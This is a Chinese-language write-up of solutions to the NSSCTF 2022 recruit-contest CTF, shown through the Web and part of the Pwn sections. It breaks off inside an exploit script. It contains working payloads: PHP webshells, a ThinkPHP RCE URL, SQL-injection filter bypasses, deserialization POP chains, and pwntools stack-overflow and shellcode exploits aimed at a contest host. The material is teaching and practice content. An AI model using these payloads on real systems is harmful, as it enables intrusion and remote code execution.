- [NSSCTF2022招新赛部分wp](#nssctf2022招新赛部分wp)
  - [Web](#web)
    - [funny_web](#funny_web)
    - [奇妙的MD5](#奇妙的md5)
    - [where_am_i](#where_am_i)
    - [ez_ez_php](#ez_ez_php)
    - [webdog1__start](#webdog1__start)
    - [Ez_upload](#ez_upload)
    - [numgame](#numgame)
    - [ez_ez_php(revenge)](#ez_ez_phprevenge)
    - [ez_rce](#ez_rce)
    - [ez_sql](#ez_sql)
    - [ez_1zpop](#ez_1zpop)
    - [1z_unserialize](#1z_unserialize)
    - [xff](#xff)
    - [js_sign](#js_sign)
    - [ez_ez_unserialize](#ez_ez_unserialize)
    - [funny_php](#funny_php)
    - [Power!](#power)
    - [file_master](#file_master)
  - [Pwn](#pwn)
    - [Does your nc work？](#does-your-nc-work)
    - [Integer Overflow](#integer-overflow)
    - [shellcode？](#shellcode)
    - [有手就行的栈溢出](#有手就行的栈溢出)
    - [FindanotherWay](#findanotherway)
    - [Darling](#darling)
  - [Reverse](#reverse)
    - [贪吃蛇](#贪吃蛇)
    - [babyre](#babyre)
    - [easyre](#easyre)
    - [xor](#xor)
    - [upx](#upx)
    - [base64](#base64)
    - [base64-2](#base64-2)
    - [android](#android)
    - [py1](#py1)
    - [py2](#py2)
    - [pypy](#pypy)
    - [android2](#android2)
    - [wasm](#wasm)
  - [Crypto](#crypto)
    - [善哉善哉](#善哉善哉)
    - [什锦](#什锦)
    - [All in Base](#all-in-base)
    - [Welcome to Modern Cryptography](#welcome-to-modern-cryptography)
    - [Sign](#sign)
    - [Matrix](#matrix)
    - [AES](#aes)
    - [爆破MD5](#爆破md5)
    - [Caesar?Ceaasr!](#caesarceaasr)
    - [Not Victoria](#not-victoria)
    - [Huge Sudoku](#huge-sudoku)
  - [Misc](#misc)
    - [Crack Me](#crack-me)
    - [Cycle Again](#cycle-again)
    - [Coffee Please](#coffee-please)
    - [Convert Something](#convert-something)
    - [Coding In Time](#coding-in-time)
    - [Cover Removed](#cover-removed)
    - [Call the Alien](#call-the-alien)
    - [Continue](#continue)

# NSSCTF2022招新赛部分wp

## Web

### funny_web

听说有人夹带私货？谁啊，我不知道

进去是个登录框，随便来点admin 123456

![screen-capture](https://nssctf.wdf.ink/img/yxy/f4095f6b771e443a6f10d45943eeac4e.png)

~~不会吧不会吧不会真的有人不知道实验室名吧~~ NSS

![screen-capture](https://nssctf.wdf.ink/img/yxy/7ed1d8ac5312617f97bfe74208c6e814.png)

不用说都知道是巨佬谢队 ************（就不贴出来了）

![screen-capture](https://nssctf.wdf.ink/img/yxy/6526a87b0d182dd0e313fb21e5ba154a.png)

嗯，好，是他了，快进到线下邦邦两拳

然后就是常规的代码审计

![screen-capture](https://nssctf.wdf.ink/img/yxy/6cefb59ca80d0d0d0d767fc5c3e9400e.png)

考点：==intval函数== 

- `intval()` 遇上 **数字** 或 **正负符号** 才开始做转换,再遇到其他字符则停止转换

构造payload：`?num=12345谢队nb` 解出

<br/>

### 奇妙的MD5

![screen-capture](https://nssctf.wdf.ink/img/yxy/06d9f39ddf693ec783c22312b03e1d83.png)

可曾听过ctf 中一个奇妙的字符串

听过：==ffifdyop==

非常神奇，在md5加密等处理后相当于以 ==' or '6== 开头的字符串，可以引发sql注入，使表达式恒成立，属于万能密码

![screen-capture](https://nssctf.wdf.ink/img/yxy/aa84d63276477cd1516575cc05c3436f.png)

我怎么知道啊！

Tips：找线索可以从以下几个方面

- `Ctrl+U` 查看源码或 `F12`
- `F12` 查看响应标头有无hint
- `F12` 找资源内有无js等可能有用的文件
- `robots.txt`

这里就采取查看源码的方式

![screen-capture](https://nssctf.wdf.ink/img/yxy/da7eb475cdec8e0d9d62d5a83355413f.png)

在注释处有一段PHP代码，又是代码审计

考点：==PHP弱比较== ==MD5绕过==

对于MD5有三种处理方案：

- 数组绕过：MD5不能加密数组，故报错并返回为null，null=null成立
  
  条件：强比较，弱比较
- 0e/科学计数法：md5 ==加密后== 为 **0e** 开头的字符串可以绕过弱比较==
  
  条件：弱比较（原理：0e开头的为科学计数法，0**6767676767 = 0）
- md5碰撞：利用fastcool等工具碰撞出两个md5相同的文件

构造payload：`?x[]=6&y[]=7` 跳转到如下界面，又是代码审计

![screen-capture](https://nssctf.wdf.ink/img/yxy/108aa7016c523fa00c1e1fdf5524df75.png)

===，强比较，直接数组绕过，得到flag

![screen-capture](https://nssctf.wdf.ink/img/yxy/7b9e5bb1c3eeb4f36f3c28f3ad9ea298.png)

<br/>

### where_am_i

~~这不合适吧，怕是应该放到misc去（~~

![screen-capture](https://nssctf.wdf.ink/img/yxy/bbc35f767bc2c84056fea727708ea071.png)

向下翻，什么东西是11位啊

一张图片，11位数字，即为图片所示酒店的电话号码

放百度搜图搜一搜

![screen-capture](https://nssctf.wdf.ink/img/yxy/3d4c4dc71cdbeea2abd6fef2397c16ff.png)

山水间 古迹酒店，查一下

![screen-capture](https://nssctf.wdf.ink/img/yxy/57de25dd6e1da993eb17159d483b6122.png)

电话有了：`028-86112888`，把短横线去掉，提交，得到flag

<br/>

### ez_ez_php

此题存在非预期解

发现有个flag.php，进去看看

![screen-capture](https://nssctf.wdf.ink/img/yxy/f68dee7c9923dfd65d71797485ff2cd6.png)

很明显的提示，伪协议，读一个名为“flag”的文件

回到最初的界面

![screen-capture](https://nssctf.wdf.ink/img/yxy/6d2d06cfb05761e15fe5fa5853a907a7.png)

substr函数在此表示取get请求的0-3个字符，明显提示为php伪协议

考点：==伪协议== ==文件包含==

- include函数可触发文件包含漏洞，此处可用伪协议非法访问靶机文件并读取

构造payload：`?file=php://filter/convert.base64-encode/resource=flag`

![screen-capture](https://nssctf.wdf.ink/img/yxy/1ddce1a5281c5441f0cec91fd82a4f3e.png)

得到一串base64，解码得到flag

![screen-capture](https://nssctf.wdf.ink/img/yxy/75071c0c967130b112c1b7b05cc7a1db.png)

*非预期解：直接读flag：http://1.14.71.254:xxxxx/flag*

<br/>

### webdog1__start

![screen-capture](https://nssctf.wdf.ink/img/yxy/d90f6f3098897c353a1b5bb6a83082b4.png)

上来，没啥思路，看个源码先

![screen-capture](https://nssctf.wdf.ink/img/yxy/d549da1cfb183e81bbfee44f9087aea1.png)

简单的代码审计，md5安排一手，一个值md5后，和自己弱比较为true，则找个==md5前后都为0e开头==的字符串

构造payload `?web=0e215962017` 跳转到如下页面

![screen-capture](https://nssctf.wdf.ink/img/yxy/b15da69d7affca59c99645036ca3a39f.png)

没思路，按照前文所述找线索的方法，我选择F12

![screen-capture](https://nssctf.wdf.ink/img/yxy/980fb24e2d7fe1fd973594041e6b23a7.png)

看到hint，去访问一下f14g.php

哦你被骗了，再来F12一下

![screen-capture](https://nssctf.wdf.ink/img/yxy/a7261e096484eb0f167dbc55ff9629cd.png)

发现hint，访问F1l1l1l1l1lag.php

![screen-capture](https://nssctf.wdf.ink/img/yxy/ee414ceefff677e154710c9d5df05347.png)

考点：==代码审计== ==限制字符长度RCE==

eval函数可执行PHP代码，存在RCE，最终目的是获得flag，一般存在于根目录，故先看看根目录有什么

这里 `if(!strstr($get," "))` 对空格做了过滤，但 `$get = str_ireplace("flag", " ", $get);` 恰好为我们提供了空格

故构造 `?get=system("lsflag/");` 列出根目录文件

![screen-capture](https://nssctf.wdf.ink/img/yxy/9e8278893f554e4279681b837fd1c676.png)

发现flag，尝试打开，但是题目中出现flag则会替换为空格，提供以下思路

- shell变量拼接：`$s=fl;$c=ag;$s$c` 原则上可行，但长度超过限制
- 通配符：* 通杀，全部打开

故构造payload： `?get=system("catflag/*");` 得到falg

<br/>

### Ez_upload

文件上传题，先burp抓个包再说

大致思路：

- 传php木马
- 蚁剑连

考点：==文件上传== ==过滤== ==一句话木马变种== ==.htaccess配置文件==

![screen-capture](https://nssctf.wdf.ink/img/yxy/985256b32bc74626794421a136428953.png)

未知上传检测，通过对后缀，文件头，MIME的测试，发现对后缀、MIME有检测

![screen-capture](https://nssctf.wdf.ink/img/yxy/61ab1748d743f45094a1191e932b7a70.png)

故`Content-Type: image/jpeg` ，但php/phtml文件无法直接上传，故尝试.htaccess

传入配置： `AddType application/x-httpd-php .jpg` 将jpg当作php处理

![截图](https://nssctf.wdf.ink/img/yxy/fabc72a46ba6e1e0e59f5c73e7936957.png)

再传php马

![截图](https://nssctf.wdf.ink/img/yxy/6be1be86b8295bbc7afb1424c3e82b7f.png)

以失败告终，盲猜对文件内容也有检测

![截图](https://nssctf.wdf.ink/img/yxy/b2046b429b6b00f4c80829d0c79be109.png)

可以看到过滤了`<?` ，采取 script 标签，传入：`<script language="php">@eval($_POST['NSSCTF'])</script>`

![截图](https://nssctf.wdf.ink/img/yxy/92926407b33188f8183623f5b1f2ac8e.png)

蚁剑连

![截图](https://nssctf.wdf.ink/img/yxy/5ed96fbf8d9a2683e86ab933af9bb1a1.png)

按照惯例从根目录找flag

![截图](https://nssctf.wdf.ink/img/yxy/d6c4a6d1be5d03335a20fbd4767bf0e0.png)

然后你就被骗了，查查环境变量罢

![截图](https://nssctf.wdf.ink/img/yxy/09f4c74f797ea735563182673b210658.png)

得到flag

<br/>

### numgame

进去就是一个很简单的数字游戏，虽然但是我可没功夫陪你玩

找线索，F12 ，Ctrl+U均被禁用，故直接使用 `view-source:` ，同时发现一个可能有用的js文件，追踪进去

![截图](https://nssctf.wdf.ink/img/yxy/2315304c67df77540f0d1ffe10389ea9.png)

好像看到了flag，又没看到

![截图](https://nssctf.wdf.ink/img/yxy/9f5ef0616799d280f25a71b9b37205e5.png)

base64解码一下，得到`NsScTf.php` ，然后去访问一下

![screen-capture](https://nssctf.wdf.ink/img/yxy/214d57345f01e2e8f1ebaa41a55515e9.png)

注意！！！此处有坑！！！出题人无形中挖了一个坑（快进到线下单杀

与GET相似的请求在网上查到的是HEAD请求，但这里明显不适用，故尝试一下POST，毕竟就GET和POST用的多了

发现 `hint2.php` ，访问得到：

![截图](https://nssctf.wdf.ink/img/yxy/427d57d8a25301b316c7816c368cfa8f.png)

暂且不知道说的什么，先记着吧，阅读一下代码

考点：==PHP类中静态方法调用== ==http请求方式==

- 对于一个类中的静态方法，可以通过`class::func` 的方式进行调用

`call_user_func` 函数可以导致RCE、非法调用函数等问题，结合前面的hint，看样子是让我们直接调用nss2中的ctf函数

用 **POST** 传一下参数，投机取巧看看是不是没有过滤

![截图](https://nssctf.wdf.ink/img/yxy/0106521b3f18f92a4008b3d1d29f5f58.png)

页面发生了变化，字变大了，一定有问题，看看源码找找线索

![截图](https://nssctf.wdf.ink/img/yxy/8f73f3352f041eeea43de8fcfe448836.png)

得到flag

<br/>

### ez_ez_php(revenge)

去除了非预期解的 **ez_ez_php** 略过

<br/>

### ez_rce

![截图](https://nssctf.wdf.ink/img/yxy/6e7413297078e53ef6c4e5ce6cd61f29.png)

真的什么都没有，按照前文 **奇妙的MD5** 所述，找线索，发现 `robots.txt` 存在线索

![截图](https://nssctf.wdf.ink/img/yxy/909378dfdc845add57042de8609dff3e.png)

访问 `/NSS/index.php/` 

![截图](https://nssctf.wdf.ink/img/yxy/197d6805f0f479cfbf6e7fd7b6ab1332.png)

wow，是ThinkPHP，火速找到详细版本号，报个错就出来了（比如404）

考点：==信息收集== ==RCE==

![截图](https://nssctf.wdf.ink/img/yxy/df4107ed633940843e0fbb15e586471b.png)

贴个现成的payload，体现了web手需要良好的信息检索能力

`http://your-ip/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /`

仅需稍作改动即可使用，`ls /` 可以换成其他shell命令

![截图](https://nssctf.wdf.ink/img/yxy/b9d0ea0f25d545758a82c35b55c3ab94.png)

发现flag，打开，似乎是假的，又从/nss找一找，最终找到flag（藏得真深啊）

![截图](https://nssctf.wdf.ink/img/yxy/7ca10c7831c3e890bcd28641e90c8804.png)

*另辟蹊径：既然可以RCE，为何不直接file_put_contents一个一句话木马呢*

### ez_sql

![screen-capture](https://nssctf.wdf.ink/img/yxy/8061068c90112e311765d069d522e6f2.png)

相对安全的方式传参： **POST** ，比GET要安全

![截图](https://nssctf.wdf.ink/img/yxy/2aa3d48b032eef01e891d27af19db65d.png)

存在注入点，爆个column数量先

![截图](https://nssctf.wdf.ink/img/yxy/ac4d382f7dbd47d96c9b5ee19f3ce3ea.png)

根据报错可以发现，我们输入的 `order by 4 #` 变成了 `derby4#`  则存在过滤

考点：==WAF绕过== ==双写绕过== ==内联注释绕过== ==联合注入==

- WAF绕过方式众多~~（甚至可以玩出花来）~~ 
- 双写绕过：order -> oorrder
- 内联注释绕过：空格->/**/
- 联合注入：union，执行联合语句

构造如下payload：`nss=1'/**/oorrder/**/by/**/4/**/#`

![截图](https://nssctf.wdf.ink/img/yxy/cf4f3d66abaf4f4f043a0a4aa27d8a7a.png)

报错，多试几个数字，发现3不会报错，则column数量为3个

![截图](https://nssctf.wdf.ink/img/yxy/a6f678c5bdc7feeaf157522e42f69999.png)

爆database name

![截图](https://nssctf.wdf.ink/img/yxy/9d7b65ee7a04b05ca78c57abfa3e726d.png)

union也被过滤了，information中存在“or”，均采用双写绕过

![截图](https://nssctf.wdf.ink/img/yxy/7778d3442493a24b419f8fa8ca9e8f19.png)

看不出来特别有用的东西，从本数据库爆个tables出来看看

![截图](https://nssctf.wdf.ink/img/yxy/6475dab6d581c116be739c914728f2e2.png)

再爆个columns

![截图](https://nssctf.wdf.ink/img/yxy/9bbcf83a4661819ce4dbd0dd5756fdbb.png)

开冲，不想一个一个看就一把梭完，用group_concat函数

~~稍微用select的特性整点活儿~~

![截图](https://nssctf.wdf.ink/img/yxy/5006523dc91e9afbaeb3843548d79146.png)

*注：使用hackbar快人一步*

![截图](https://nssctf.wdf.ink/img/yxy/c1386745b024a3283046e2f9b206cf5c.png)

<br/>

### ez_1zpop

简单的反序列化+pop链构造

首先定位危险函数

![截图](https://nssctf.wdf.ink/img/yxy/4bdb67c3bdcc6c57f4fef9f49e46a02d.png)

`unserialize` 函数可触发反序列化漏洞

考点：==反序列化== ==POP链== ==可变函数== ==wakeup绕过==

- 反序列化：在此之前可能需要具备一些OOP功底，至少要知道什么是对象什么是实例
- PHP魔术函数
  
  `__wakeup`：在被反序列化时调用，常需绕过
  
  `__construct`：在对象被实例化时调用，常作为入口
  
  `__destruct`：在对象被销毁时调用，常作为入口
  
  `__toString`：在对象被当作字符串处理时调用（被echo，print......），常作为桥梁
- 可变函数：对于 `$func($para)` 这种结构，函数名为变量，则PHP会寻找到 ==与变量的值同名的函数== 例如：`$func="print"` 时，该表达式表示`print($para)`
- POP链：即面向过程编程构造链子，通过控制程序执行过程来达到攻击者目的，这就意味着不能进行方法重写，而只能修改某些==可控的变量==

构造过程（逆推法）：

1. 先要达到的目的是查看根目录有什么，则需执行 `system("ls /")`
2. 要执行此代码，则需通过**fin** 中的 **fmm** 方法构造可变函数
3. 需要调用 **fin** 中的 **fmm** 方法，可以借助 **lt** 中的 **__toString** 方法（`$this->impo->fmm()`）
4. 要保证 **fin** 被正常调用，则 `__wakeup()` 方法 ==必须失效==（CVE-2016-7124）
5. 需要调用 **lt** 中的 **__toString** ，可以借助 **lt** 中的 **__destruct** 方法（`echo $this`）
6. 入口为 **lt** 中的 **__destruct** 方法

完整的POP链：`lt::__destruct() -> lt::__toString() -> fin::fmm()`

根据POP链，为可控变量赋值，得到以下exp：

```php
<?php
class lt
{
   public $impo;
   public $md51;
   public $md52;
}

class fin
{
   public $a;
   public $url;
   public $title;
}

//以上代码都是抄的类和类中的变量

$a = new lt;
$b = new fin;
$a->impo=$b;
$a->md51=array(1);
$a->md52=array(2);
$b->a = "system"; //可变函数的函数名
$b->title = "ls /"; // 可变函数的参数
echo serialize($a);

?>
```

得到：`O:2:"lt":3:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";N;s:5:"title";s:4:"ls /";}s:4:"md51";a:1:{i:0;i:1;}s:4:"md52";a:1:{i:0;i:2;}}`

通过修改序列化成员数，使其大于实际的成员数，即可绕过wakeup，得到：`O:2:"lt":7:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";N;s:5:"title";s:4:"ls /";}s:4:"md51";a:1:{i:0;i:1;}s:4:"md52";a:1:{i:0;i:2;}}`

保险起见，urlencode一下：`O%3A2%3A%22lt%22%3A7%3A%7Bs%3A4%3A%22impo%22%3BO%3A3%3A%22fin%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22url%22%3BN%3Bs%3A5%3A%22title%22%3Bs%3A4%3A%22ls%20%2F%22%3B%7Ds%3A4%3A%22md51%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A4%3A%22md52%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D`

参数名为NSS，用GET传参，得到根目录下文件：

![截图](https://nssctf.wdf.ink/img/yxy/02c41db974d86f4279e4173765d6d0d9.png)

发现flag，修改可变函数参数为`cat /flag`，再绕过__wakeup()，urlencode一下，解出

<br/>

### 1z_unserialize

非常简单的反序列化

按照一般思路，先看看根目录，再做处理

参考前文 **ez_1zpop** ，直接构造exp

```php
<?php
 
class lyh
{
    public $url;
    public $lt;
    public $lly;
}

$a = new lyh;
$a -> lt = "system"; //可变函数的函数名
$a -> lly = "ls /"; //可变函数的参数

echo serialize($a);
 
?> 
```

![截图](https://nssctf.wdf.ink/img/yxy/3d253bdc5e7a60068a4883c172858161.png)

发现flag，打开即可

![截图](https://nssctf.wdf.ink/img/yxy/9df8b9868b3c6b2ee9308fada999f398.png)

<br/>

### xff

“我是本地人”这句话很xff

考点：==XFF== ==Referer==

xff，即X-Forwarded-For，添加到header中，告诉对面这边的真实IP，通过伪造XFF可以骗过对面，让对面觉得自己就是本地访问（当然检测本地访问不止这一条路）

![截图](https://nssctf.wdf.ink/img/yxy/1fd10d400eb8a80302a5b86eceb386d0.png)

jump from，想到Referer，表示你从哪儿来的

![截图](https://nssctf.wdf.ink/img/yxy/e699d6c802dd47d9ae460abb862599f5.png)

得到flag

<br/>

### js_sign

~~这个也该放到misc去吧（~~

通过题目名就知道要找js，翻阅源码得到mian.js

![截图](https://nssctf.wdf.ink/img/yxy/a366b924102388e631aeb281efdf9a6e.png)

有个疑似base64的东西，先解了看看

![截图](https://nssctf.wdf.ink/img/yxy/eaef069a5fabcc2f8ed8727a6c476e39.png)

tapcode？敲击码！可以基本断定那一串数字是敲击码了

![截图](https://nssctf.wdf.ink/img/yxy/43c69237a81446bb80ccdffdd2377d43.png)

33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15

不知道为啥在线解码不靠谱，只得手动摸咯

![截图](https://nssctf.wdf.ink/img/yxy/b8cf059b41fa2b15704fea2ba632c12e.png)

解码可得：NSSCTF{youfindflagbytapcode}

<br/>

### ez_ez_unserialize

又是反序列化，具体知识点参考前文 **ez_1zpop**

`$_REQUEST['x']` 表示传入一个名为 `x` 的参数，方法不限

考点：==反序列化== ==文件包含== 

- `highlight_file` 可触发文件包含漏洞，对应伪协议

构造exp：

```php
<?php
class X
{
    public $x;
}

$a = new X;
$a->x="php://filter/convert.base64-encode/resource=fllllllag.php";
echo serialize($a);
?>
```

绕过__wakeup，再urlencode一下得到payload：`O%3A1%3A%22X%22%3A7%3A%7Bs%3A1%3A%22x%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dfllllllag.php%22%3B%7D`

![截图](https://nssctf.wdf.ink/img/yxy/d47ccda5a09fa517d0bb4947d3b1831b.png)

得到一串base64，解码可得flag

![截图](https://nssctf.wdf.ink/img/yxy/ca7bbe99a6fc663afa1a4993cd0d9023.png)

<br/>

### funny_php

确实挺funny的

![截图](https://nssctf.wdf.ink/img/yxy/cbf3e2c4345bcb4eaa8f056df65c4af6.png)

考点：==科学计数法绕过== ==双写绕过== ==md5弱比较==

- 科学计数法绕过：**数字+e** 开头的字符串在进行比较运算时会当作科学计数法
- 双写绕过：参照前文 **ez_sql** 
- md5弱比较：参照前文 **奇妙的MD5**
  
  附上md5后为0e开头的字符串及其md5值
  ```
  QNKCDZO
  0e830400451993494058024219903391
  240610708
  0e462097431906509019562988736854
  s878926199a
  0e545993274517709034328855841020
  s155964671a
  0e342768416822451524974117254469
  s214587387a
  0e848240448830537924465865611904
  s214587387a
  0e848240448830537924465865611904
  s878926199a
  0e545993274517709034328855841020
  s1091221200a
  0e940624217856561557816327384675
  s1885207154a
  0e509367213418206700842008763514
  s1502113478a
  0e861580163291561247404381396064
  s1885207154a
  0e509367213418206700842008763514
  s1836677006a
  0e481036490867661113260034900752
  s155964671a
  0e342768416822451524974117254469
  s1184209335a
  0e072485820392773389523109082030
  s1665632922a
  0e731198061491163073197128363787
  s1502113478a
  0e861580163291561247404381396064
  s1836677006a
  0e481036490867661113260034900752
  s1091221200a
  0e940624217856561557816327384675
  s155964671a
  0e342768416822451524974117254469
  s1502113478a
  0e861580163291561247404381396064
  s155964671a
  0e342768416822451524974117254469
  s1665632922a
  0e731198061491163073197128363787
  s155964671a
  0e342768416822451524974117254469
  s1091221200a
  0e940624217856561557816327384675
  s1836677006a
  0e481036490867661113260034900752
  s1885207154a
  0e509367213418206700842008763514
  s532378020a
  0e220463095855511507588041205815
  s878926199a
  0e545993274517709034328855841020
  s1091221200a
  0e940624217856561557816327384675
  s214587387a
  0e848240448830537924465865611904
  s1502113478a
  0e861580163291561247404381396064
  s1091221200a
  0e940624217856561557816327384675
  s1665632922a
  0e731198061491163073197128363787
  s1885207154a
  0e509367213418206700842008763514
  s1836677006a
  0e481036490867661113260034900752
  s1665632922a
  0e731198061491163073197128363787
  s878926199a
  0e545993274517709034328855841020
  ```

构造payload：

```
GET：`?num=9e9&str=NNSSCTFSSCTF`    

POST：`md5_1=s878926199a&md5_2=s1885207154a`
```

![截图](https://nssctf.wdf.ink/img/yxy/bc7fca90655aa3a67f7274ad00bb3fca.png)

<br/>

### Power!

年轻人你渴望力量吗？查看源码，得知需要传参

![截图](https://nssctf.wdf.ink/img/yxy/0ec755deae500da311fdfc7fc8c743ce.png)

好长一串代码审计

![截图](https://nssctf.wdf.ink/img/yxy/777e35b0071b7b5803e6059a2c69db82.png)

反序列化和POP链的基础知识参考前文 **ez_1zpop**

- `__call()`：在尝试调用类方法，而方法不存在时被调用，常用作桥梁

class暂且不看，可以直接得到以下信息，尝试传入image_path以读取flag.php

![截图](https://nssctf.wdf.ink/img/yxy/531755fba797d5ac159d5d7a2d1205eb.png)

![截图](https://nssctf.wdf.ink/img/yxy/38bcc0f2155271993b3c996c0ebae18c.png)

得到base64编码后的flag.php，解码试试

![截图](https://nssctf.wdf.ink/img/yxy/2dcf20eb1bf4be896562d64cd0bf5863.png)

flag被放在了 127.0.0.1:65500 属于内网地址，外网无法访问

考点：==SSRF== ==POP链== ==反序列化== ==变量覆盖==

![截图](https://nssctf.wdf.ink/img/yxy/d4b287a5065ce452eb85d28da8552fa3.png)

先base64解码，再反序列化 -> 序列化后base64编码一下

构造过程：

1. **FileViewer::curl()** 可导致SSRF
   - 局部变量： `$url` = `$path` = `http://127.0.0.1:65500/flag`
2. **FileViewer::loadfile()** 可执行 **FileViewer::curl()** ，顺便把黑名单搞了
   - 局部变量：`$this->black_list="黑名单什么的管不着我"` ，`$this->local = http://127.0.0.1` ，`$this->path = /flag`
3. **FileViewer::_call()**  可执行 **FileViewer::loadfile()** 
   - 局部变量：无
4. **Backdoor::__destruct()** 可执行 **FileViewer::__call()**
   - 局部变量：`$this->a = new FileViewer`
5. **Backdoor::__destruct()** 为入口，==但是不存在 **loadfile()** 方法，会报错==，故作第二入口
   - 局部变量：无
6. 仅 **FileViewer** 可能作为入口，且不能绕过 **__wakeup()** 方法，==返回bool报错==
   - 局部变量：`$this->local = new Backdoor`
     
     `black_list` 与 `path` 在 `loadfine()` 方法中会被当作字符串处理，由于 `Backdoor` 无 `__toString()` 方法，==会报错==
7. **Backdoor::goodman()** 变量覆盖，直接对 **local** 进行修改
   - 局部变量：`$this->b = "local"` ，`$this->superhacker = "http://127.0.0.1:65500"`
8. 调用反序列化后的 **loadfile()** 方法

故构造如下POP链：`FileViewer -> Backdoor::__destruct() -> FileViewer::__call() -> FileViewer::loadfile() -> FileViewer::curl()`

贴个exp：

```php
<?php
class FileViewer
{
    public $black_list;
    public $local;
    public $path;
}
class Backdoor
{
    public $a;
    public $b;
    public $superhacker;
}

$m = new FileViewer;
$n = new Backdoor;
$n->a=$m;
$n->b="local";
$n->superhacker="127.0.0.1:65500/";
$m->black_list="黑名单什么的管不着我";
$m->local=$n;
$m->path="flag.php";

echo (base64_encode(serialize($m))); //不urlencode了，裸奔！
?>
```

![截图](https://nssctf.wdf.ink/img/yxy/bd72da485d84d96a9ea07bd6aa58a34e.png)

得到base64，解码

![截图](https://nssctf.wdf.ink/img/yxy/31553ac2dfa106c0cb0a7b5a562e9943.png)

![截图](https://nssctf.wdf.ink/img/yxy/0ca163d80d930e3726137e3a13e868f6.png)

得到flag

### file_master

~~哇好臭的题啊~~

有查看文件，进去直接查index.php，发现index.php加载了两遍，查看成功

![截图](https://nssctf.wdf.ink/img/yxy/0db191c3a5289964dfb59500cbdf7b07.png)

翻阅源码，没高亮看着头疼，扒下来

![截图](https://nssctf.wdf.ink/img/yxy/dafed0b957cbd0c01d0180f9d7e15880.png)

考点：==文件上传== ==图片马== ==一句话木马变种== ==短标签== ==PHPSESSID==

发现文件上传处做了几重检测，结合die的提示可以获得如下信息

- MIME检测：参照前文 **Ez_upload** 
- 文件头检测：图片马
- 宽高检测：20*20以内
- 关键词检测：不能有”php“在内

上传一句话木马，此处使用图片马，在图片后面直接加上PHP语句

过滤后不能使用`<?php`标签，采用短标签，构造payload `<?=eval($_POST['NSSCTF']);`

找到对应路径，sessionid即为==PHPSESSID==，存在于==cookie==中

蚁剑连，可能会出现权限不足等问题，查看环境变量未找到flag

![截图](https://nssctf.wdf.ink/img/yxy/c22afdadc1777bc49e5dcee865a0f4c6.png)

![截图](https://nssctf.wdf.ink/img/yxy/6adefc3980d10247b910d0ffb2c459f7.png)

利用虚拟终端切到根目录，发现flag，打开，解出

![截图](https://nssctf.wdf.ink/img/yxy/1fa199b5140726f5f306932e3caa12e5.png)

<br/>

## Pwn

### Does your nc work？

nc签到，直接连上去

通过一些简单的shell命令找到flag

考点：==netcat== ==shell命令==

![screen-capture](https://nssctf.wdf.ink/img/yxy/2ec59ad445c80e5d7d3028a28f7ede36.png)

<br/>

### Integer Overflow

顾名思义，整数溢出，先checksec一下，发现是32位程序，拖进IDA

![image-20221024215803927](https://nssctf.wdf.ink/img/yxy/image-20221024215803927.png)

存在一个 overflow() 函数，追踪进去

![](https://nssctf.wdf.ink/img/yxy/image-20221024224214883.png)

一路追踪到 choice1() 函数里，发现存在溢出点

![image-20221024224400900](https://nssctf.wdf.ink/img/yxy/image-20221024224400900.png)

考点：**整数溢出**

整数溢出的利用在于绕过大小限制，同时又可以导致缓冲区溢出

此处缓冲区[ebp-20h]，则填充0x20长度的垃圾数据，使缓冲区溢出

找到危险函数 pwn_me() ，发现存在system，但无bin/sh

![image-20221024233253238](https://nssctf.wdf.ink/img/yxy/image-20221024233253238.png)

追踪system的plt地址：0x08049100

![image-20221024233338670](https://nssctf.wdf.ink/img/yxy/image-20221024233338670.png)

无bin/sh，shift+F12查一下字符串，发现存在：0x0804A008

![image-20221024233430760](https://nssctf.wdf.ink/img/yxy/image-20221024233430760.png)

覆盖system参数的方法参考这篇文章：[pwn小白入门06--ret2libc](https://blog.csdn.net/weixin_45943522/article/details/120469196)

贴个exp：

```python
from pwn import *

sh = remote("1.14.71.254","xxxxx")
system_addr = 0x08049100	
bin_addr = 0x0804A008

sh.sendline(b"1")
sh.sendline(b"-1")
payload = b'a'*0x20 + p32(0) + p32(system_addr) + p32(0) +p32(bin_addr)
sh.sendline(payload)

sh.interactive()
```





### shellcode？

很基础的shellcode，利用pwntools直接生成即可

直接贴exp：

```python
from pwn import *

sh = remote("1.14.71.254","xxxxx")

payload = asm(shellcraft.sh())

sh.sendline(payload)
sh.interactive()
```



### 有手就行的栈溢出

栈溢出，附件直接拖IDA

![image-20221024234534082](https://nssctf.wdf.ink/img/yxy/image-20221024234534082.png)

存在 overflow() 函数，追踪进去发现是一个gets函数，存在栈溢出风险

![image-20221024234640339](https://nssctf.wdf.ink/img/yxy/image-20221024234640339.png)

v1为[rbp-20h]，故需要填充0x20长度的垃圾数据

找到 gift() 函数，发现你被骗了，根本没法getshell，而在 fun() 函数则可以

![image-20221024235006809](https://nssctf.wdf.ink/img/yxy/image-20221024235006809.png)

追踪 fun() 函数的地址：0x0000000000401257

![image-20221024235458263](https://nssctf.wdf.ink/img/yxy/image-20221024235458263.png)

贴个exp：

```python
from pwn import *

sh = remote('1.14.71.254',"xxxxx")
shell_addr = 0x0000000000401257

payload = b'a'*0x20 + p64(0) + p64(shell_addr)

sh.sendline(payload)
sh.interactive()
```





### FindanotherWay

IDA打开附件，发现 vuln() 函数，追踪进去

![image-20221024235848033](https://nssctf.wdf.ink/img/yxy/image-20221024235848033.png)

发现 gets 函数，存在栈溢出：

![image-20221024235924094](https://nssctf.wdf.ink/img/yxy/image-20221024235924094.png)

s为[rbp-Ch]，故需要填充0xC长度的垃圾数据

继续找到 youfindit 函数，发现存在bin/sh

![image-20221025000024709](https://nssctf.wdf.ink/img/yxy/image-20221025000024709.png)

追踪此函数地址：

![image-20221025000051731](https://nssctf.wdf.ink/img/yxy/image-20221025000051731.png)

发现需要 findanotherway，那就直接抓rbp, rsp地址：0x0000000000401235

![image-20221025000730426](https://nssctf.wdf.ink/img/yxy/image-20221025000730426.png)

贴个exp：

```python
from pwn import *

sh = remote('1.14.71.254','xxxxx')
